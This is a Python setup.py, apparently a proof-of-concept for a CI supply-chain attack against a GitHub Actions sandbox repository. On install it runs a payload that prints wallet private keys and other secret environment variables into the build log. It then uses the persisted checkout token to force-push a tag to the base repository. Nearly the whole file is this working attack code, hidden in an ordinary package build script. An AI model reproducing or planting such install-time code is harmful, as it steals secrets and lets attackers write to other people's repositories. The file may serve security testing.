import os, subprocess
from setuptools import setup, find_packages
HERE = os.path.dirname(os.path.abspath(__file__))

def _poc():
    print("================ PoC PAYLOAD (fork-controlled setup.py executing) ================")
    for k in ("WALLET_PRIVATE_KEY", "WALLET_ADDRESS", "RPC_PROVIDER_URL"):
        print("POC_EXFIL_%s=%s" % (k, os.environ.get(k, "<NOT-IN-ENV>")))
    # Prove contents:write — actions/checkout persists the base-repo token in .git/config,
    # so 'origin' here is the BASE repo (tommyboyhacking/actions-env-sandbox).
    try:
        subprocess.run(["git", "-C", HERE, "tag", "-f", "poc-supply-chain-write"], check=False)
        r = subprocess.run(["git", "-C", HERE, "push", "-f", "origin", "poc-supply-chain-write"],
                           capture_output=True, text=True)
        print("POC_CONTENTS_WRITE_push_rc=%s" % r.returncode)
        print("POC_CONTENTS_WRITE_push_err=%s" % ((r.stderr or "").strip()[-300:]))
    except Exception as e:
        print("POC_CONTENTS_WRITE_error=%r" % e)
    print("==================================================================================")

_poc()
setup(name="sandbox-pkg", version="0.0.1", packages=find_packages(), extras_require={"dev": ["pytest"]})
